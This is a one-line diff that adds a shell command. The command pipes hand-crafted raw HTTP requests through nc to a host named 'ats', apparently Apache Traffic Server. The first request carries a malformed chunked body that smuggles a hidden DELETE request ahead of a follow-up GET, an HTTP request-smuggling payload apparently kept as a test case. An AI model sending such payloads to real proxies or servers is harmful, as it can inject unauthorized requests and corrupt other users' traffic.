@@ -1,0 +1,1 @@
+for s in 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n2\r\r;a\r\n02\r\n2d\r\n0\r\n\r\nDELETE / HTTP/1.1\r\nContent-Length: 183\r\n\r\n0\r\n\r\n' 'GET / HTTP/1.1\r\n\r\n'; do printf "$s"; sleep .5; done | nc ats 80
